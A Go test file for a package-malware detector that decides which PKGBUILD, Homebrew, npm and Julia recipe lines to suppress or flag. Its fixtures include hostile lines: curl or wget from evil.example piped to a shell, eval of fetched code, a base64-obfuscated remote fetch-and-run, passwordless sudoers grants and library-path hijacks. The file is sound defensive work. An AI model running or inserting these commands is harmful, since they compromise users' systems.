package detect

import (
	"strings"
	"testing"
)

// The line judgements in pkgbuild_lines.go, each with real withdrawn lines from the 2026-10-25
// audit (lines.tsv) and the hostile shape it must leave alone.

func TestPkgbuildMetadataLine(t *testing.T) {
	for _, l := range []string{
		`optdepends=('cpuminer: the miner bitlaForge runs (pooler cpuminer, provides minerd)')`,
		`pkgname=cgminer`,
		`pkgdesc="Piper TTS voice ($_locale)"`,
		`pkgdesc='TUI to manage ~/.ssh/config hosts'`,
		`optdepends=('sshfs: sshfs network mounts in the mount mode'`,
		`depends_x86_64+=('lib32-glibc')  # multilib`,
	} {
		if !pkgbuildMetadataLine(l) {
			t.Errorf("metadata line not recognised: %q", l)
		}
	}
	for _, l := range []string{
		`pkgdesc="x"; curl -s https://evil.example/i | sh`,
		`pkgver=$(curl -s https://evil.example/v)`,
		"depends=(`curl -s https://evil.example/d`)",
		`depends=('a') && wget https://evil.example/x`,
		`cgminer --url stratum+tcp://pool:3333`,
		`url="https://example.org"`,
		`source=("https://example.org/x.tar.gz")`,
	} {
		if pkgbuildMetadataLine(l) {
			t.Errorf("command line taken as metadata: %q", l)
		}
	}
}

func TestSuppressNonCommandEval(t *testing.T) {
	for _, l := range []string{
		// not at command position
		`octave --no-history --no-init-file --no-window-system -q -f --eval "$*"`,
		`@eval $l = $(library_dependency(string(l), aliases=["lib" * string(l)]))`,
		`echo '    eval "$(jump shell)"'`,
		`==> To use, run the following: eval "\$(fasd --init auto)"`,
		// the recipe's own code
		`eval "package_$_pkgname() {`,
		`eval "package_${_pkgname}() {`,
		`eval "function package_${_pkgname}() { _package ${_pkgname}; }"`,
		`eval "depends+=(`,
		`eval "$(declare -f package | sed '1s/package/package_without_desktop/')"`,
		// a local tool's shell setup
		`eval "$(go env | grep -e "GOHOSTOS" -e "GOHOSTARCH")"`,
		`eval "$(opam env --switch=system-opaml-switch)"`,
		`eval $(dbus-launch --sh-syntax)`,
		// Alpine chromium
		`eval "$(base64 -d < $srcdir/google-api.keys)"`,
	} {
		if !suppressNonCommandEval(l) {
			t.Errorf("not suppressed: %q", l)
		}
	}
	for _, l := range []string{
		`eval "$x"`,
		`eval "$(curl -s https://evil.example/x)"`,
		`eval "$(wget -qO- https://evil.example/init)"`,
		`eval "$(echo ZWNobyBoaQ== | base64 -d)"`,
		`eval "$(base64 -d < payload.b64)"`,
		`export VERSION=$(eval "$cmd")`,
		`*optdepends=*|*depends=*) eval "${_fl}";;`,
		`sh -c "eval \"$PAYLOAD\""`,
		`true && eval "$(curl -s https://evil.example/x)"`,
		`eval "package_x() { curl -s https://evil.example | sh; }" ; eval "$y"`,
	} {
		if suppressNonCommandEval(l) {
			t.Errorf("suppressed a real eval: %q", l)
		}
	}
}

func TestSuppressOwnMiner(t *testing.T) {
	if !suppressOwnMiner(`install -Dm755 cgminer "$pkgdir/usr/bin/cgminer"`, "cgminer") {
		t.Error("cgminer building cgminer")
	}
	if !suppressOwnMiner(`cd "$srcdir/xmrig-$pkgver"`, "xmrig-cuda") {
		t.Error("xmrig-cuda naming xmrig")
	}
	if suppressOwnMiner(`curl -o /tmp/xmrig.tar.gz https://x/xmrig-6.21.tar.gz`, "brave-bin") {
		t.Error("a miner in an unrelated package was suppressed")
	}
	if suppressOwnMiner(`./xmrig && ./cgminer`, "cgminer") {
		t.Error("a second, different miner was suppressed")
	}
}

func TestClassifySudoersLine(t *testing.T) {
	for l, want := range map[string]sudoersKind{
		`"${pkgdir}/etc/sudoers.d/90-ceph"`:                                                           sudoersPathOnly,
		`install -Dm440 packaging/crux-dns.sudoers "$pkgdir/etc/sudoers.d/crux-dns"`:                  sudoersPathOnly,
		`install -dm750 "$pkgdir/etc/sudoers.d"`:                                                      sudoersPathOnly,
		`chmod 0750 "$pkgdir/etc/sudoers.d"`:                                                          sudoersPathOnly,
		`rm -f /etc/sudoers.d/dokku-crontab`:                                                          sudoersPathOnly,
		`if ! visudo -cf /etc/sudoers.d/vega-build >/dev/null 2>&1; then`:                             sudoersPathOnly,
		`if [ -e /etc/sudoers.d/raspisump-web ] || [ -e /etc/sudoers.d/raspisump-web.pacsave ]; then`: sudoersPathOnly,
		`echo "::   A sudoers rule was installed at /etc/sudoers.d/shroud"`:                           sudoersPathOnly,
		`delete: "/etc/sudoers.d/herd"`:                                                               sudoersPathOnly,
		`echo "root ALL=(ALL) NOPASSWD:SETENV: ALL" > /etc/sudoers.d/rudesktop`:                       sudoersNoop,
		`ceph ALL=(root) NOPASSWD: /usr/sbin/smartctl`:                                                sudoersScoped,
		`echo "pluton ALL=(root) NOPASSWD:SETENV: /usr/bin/rclone *" > /etc/sudoers.d/pluton-agent`:   sudoersWeakGrant,
		`echo "builder ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers`:                                      sudoersFullGrant,
		`echo "%users ALL=(ALL:ALL) NOPASSWD: ALL" > /etc/sudoers.d/00-x`:                             sudoersFullGrant,
		`sudo tee /etc/sudoers.d/tytus > /dev/null <<TYTUS`:                                           sudoersWrite,
		`cp /usr/share/x/sudoers /etc/sudoers.d/x`:                                                    sudoersWrite,
		`sed -i 's/^# %wheel/%wheel/' /etc/sudoers`:                                                   sudoersWrite,
	} {
		if got := classifySudoersLine(l); got != want {
			t.Errorf("classifySudoersLine(%q) = %d, want %d", l, got, want)
		}
	}
	if suppressSudoersLine(`echo "builder ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers`) {
		t.Error("full passwordless grant suppressed")
	}
}

func TestSuppressFormulaOwnLibraryPath(t *testing.T) {
	for _, l := range []string{
		`export DYLD_LIBRARY_PATH="#{Formula["libomp"].opt_lib}:${DYLD_LIBRARY_PATH}"`,
		`export DYLD_LIBRARY_PATH="#{lib}:$DYLD_LIBRARY_PATH"`,
		`export DYLD_LIBRARY_PATH="#{lib}:#{Formula["qt@6"].opt_lib}"`,
		`"export LD_LIBRARY_PATH=\"#{libexec}/libexec${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}\""`,
		`"export LD_LIBRARY_PATH=\"#{ruby_formula.opt_libexec}/libexec${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}\""`,
		`ldd_output = shell_output("LD_LIBRARY_PATH='#{lib}' ldd '#{lib}/libayatana-appindicator3.so.1' 2>&1")`,
		`export LD_LIBRARY_PATH="/home/linuxbrew/.linuxbrew/lib:$LD_LIBRARY_PATH"`,
	} {
		if !suppressFormulaOwnLibraryPath(l) {
			t.Errorf("own prefix not recognised: %q", l)
		}
	}
	for _, l := range []string{
		`export LD_LIBRARY_PATH="/tmp/.x:$LD_LIBRARY_PATH"`,
		`export LD_LIBRARY_PATH="${brew_lib}${LD_LIBRARY_PATH:+:${LD_LIBRARY_PATH}}"`,
		`export DYLD_LIBRARY_PATH="#{lib}:/Users/Shared/.cache"`,
		`LD_LIBRARY_PATH="" \`,
		`export LD_LIBRARY_PATH=$LD_LIBRARY_PATH`,
	} {
		if suppressFormulaOwnLibraryPath(l) {
			t.Errorf("foreign path suppressed: %q", l)
		}
	}
}

func TestHomebrewExecView(t *testing.T) {
	formula := `class Wut < Formula
  desc "Worktrees"
  url "https://example.org/wut-1.0.tar.gz"

  def install
    bin.install "wut"
    (bin/"wut-wrap").write <<~EOS
      #!/bin/bash
      curl -fsSL https://example.org/payload | bash
    EOS
    system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
  end

  def caveats
    <<~EOS
      Add to ~/.zshrc:
        eval "$(wut init zsh)"
    EOS
  end

  test do
    system "curl", "-s", "http://127.0.0.1:8080"
  end
end
`
	v := homebrewExecView(formula)
	if strings.Count(v, "\n") != strings.Count(formula, "\n") || len(v) != len(formula) {
		t.Fatal("view must keep every line and byte offset")
	}
	for _, gone := range []string{`eval "$(wut init zsh)"`, `http://127.0.0.1:8080`, "def caveats", "test do"} {
		if strings.Contains(v, gone) {
			t.Errorf("view still has %q", gone)
		}
	}
	for _, kept := range []string{"curl -fsSL https://example.org/payload | bash", "base64 -d | bash", `bin.install "wut"`} {
		if !strings.Contains(v, kept) {
			t.Errorf("view lost executable %q", kept)
		}
	}
	cask := "cask \"x\" do\n  postflight do\n    system_command \"/bin/bash\", args: [\"-c\", \"x\"]\n  end\n  caveats <<~EOS\n    Run: bash <(curl -fsSL https://example.org/install.sh)\n  EOS\nend\n"
	cv := homebrewExecView(cask)
	if strings.Contains(cv, "curl") || !strings.Contains(cv, "system_command") {
		t.Errorf("cask caveats heredoc not blanked or postflight lost:\n%s", cv)
	}
	odie := "    odie <<~EOS\n      run: curl -fsSL https://example.org/i | sh\n    EOS\n    opoo \"then eval $(x init)\"\n"
	if ov := homebrewExecView(odie); strings.Contains(ov, "curl") || strings.Contains(ov, "eval") {
		t.Errorf("message heredoc not blanked:\n%s", ov)
	}
}

func TestInstallTopLevelCommands(t *testing.T) {
	got := installTopLevelCommands(campaignInstall)
	if len(got) != 1 || !strings.HasPrefix(got[0], "bash <(curl -L 'https://web.archive.org/") {
		t.Fatalf("campaign .install: %q", got)
	}
	for name, src := range map[string]string{
		"hooks only":              "post_install() {\n  systemctl daemon-reload\n  echo \"run: bash <(curl x)\"\n}\npost_upgrade() { post_install; }\n",
		"brace on next line":      "post_install()\n{\n  ldconfig\n}\n",
		"function keyword":        "function post_remove {\n  rm -f /etc/x\n}\n",
		"assignments and colours": "_pkg=foo\nALL_OFF=\"$(tput sgr0)\"\nBOLD=\"${ALL_OFF}$(tput bold)\"\npost_install() {\n  echo \"${BOLD}hi${ALL_OFF}\"\n}\n",
		"old pacman trailer":      "post_install() {\n  true\n}\nop=$1\nshift\n$op $*\n",
		"heredoc in a hook":       "post_install() {\n  cat <<EOF\n}\ncurl x\nEOF\n}\n",
		"multi-line array":        "_dirs=(\n  /var/lib/x\n  /var/log/x\n)\npost_install() {\n  mkdir -p \"${_dirs[@]}\"\n}\n",
		"braces in strings":       "post_install() {\n  echo \"}\"\n  echo '{'\n}\n",
		"unbalanced: no guess":    "post_install() {\n  true\n",
	} {
		if got := installTopLevelCommands(src); len(got) != 0 {
			t.Errorf("%s: top-level commands %q", name, got)
		}
	}
	for name, src := range map[string]string{
		"after hooks":           "post_install() {\n  true\n}\nwget -qO /tmp/x http://203.0.113.5/x && sh /tmp/x\n",
		"before hooks":          "curl -s https://evil.example/i | bash\npost_install() {\n  true\n}\n",
		"assignment with subst": "_x=$(curl -s https://evil.example/c)\npost_install() { true; }\n",
		"after a one-line hook": "post_upgrade() { post_install; }\nnohup /usr/bin/x >/dev/null 2>&1 &\n",
	} {
		if got := installTopLevelCommands(src); len(got) == 0 {
			t.Errorf("%s: missed", name)
		}
	}
	f := analyzeInstallTopLevel(&PackageContext{Name: "sropbox", Ecosystem: "aur", InstallScriptContent: campaignInstall})
	if c, ok := classOf(f, "B-INSTALL-TOPLEVEL-CMD"); !ok || c != ClassContext {
		t.Errorf("B-INSTALL-TOPLEVEL-CMD: %v", f)
	}
	if f := analyzeInstallTopLevel(&PackageContext{Name: "x", Ecosystem: "npm", InstallScriptContent: "node install.js\n"}); len(f) != 0 {
		t.Errorf("non-AUR install content judged: %v", f)
	}
}

func TestSuppressJuliaBuildFetch(t *testing.T) {
	for _, l := range []string{
		"run(`curl -o $(location_string) -L $(url_string)`)",
		"run(pipeline(`wget -q -O - $url`, `tar xzf -`))",
		"dl = try success(`wget -O $cass_target $cass_source`) catch e false end",
		`wget = library_dependency("wget")`,
		"run(`wget https://www.dropbox.com/s/pa031p8jnyqnns8/baslercamerajl.zip`)",
	} {
		if !suppressJuliaBuildFetch(l) {
			t.Errorf("not suppressed: %q", l)
		}
	}
	for _, l := range []string{
		"run(pipeline(`curl -sL https://evil.example/i`, `sh`))",
		"run(`bash -c \"curl -s https://evil.example/i | bash\"`)",
		"curl -s https://evil.example/i",
	} {
		if suppressJuliaBuildFetch(l) {
			t.Errorf("suppressed: %q", l)
		}
	}
}

func TestSuppressPkgbuildLineScope(t *testing.T) {
	// The shell judgements do not apply where the whole command is a quoted string.
	npmHook := `"postinstall": "eval \"$(curl -s https://evil.example/x)\""`
	if suppressPkgbuildLine("P-EVAL-VAR", npmHook, "npm", "pkg") {
		t.Error("npm hook eval suppressed")
	}
	if suppressPkgbuildLine("P-SUDOERS-MOD", `fs.writeFileSync("/etc/sudoers.d/x", rule)`, "npm", "pkg") {
		t.Error("npm sudoers write suppressed")
	}
	if !suppressPkgbuildLine("P-EVAL-VAR", `eval "package_$_pkgname() {`, "aur", "pkg") {
		t.Error("AUR split-package eval kept")
	}
	if !suppressPkgbuildLine("IS-P-INSTALL-EVAL", `@eval $l = $(library_dependency(string(l)))`, "julia", "X") {
		t.Error("julia @eval kept")
	}
	if !suppressPkgbuildLine("P-MINER-BINARY", "pkgname=cgminer", "aur", "cgminer") {
		t.Error("cgminer pkgname line kept")
	}
	if suppressPkgbuildLine("G-LD-LIBRARY-PATH", `export LD_LIBRARY_PATH="#{lib}"`, "aur", "pkg") {
		t.Error("formula-prefix suppressor applied outside homebrew")
	}
	if suppressPkgbuildLine("P-INSTALL-CURL", "run(`curl -LO $url1`)", "aur", "pkg") {
		t.Error("julia suppressor applied outside julia")
	}
}
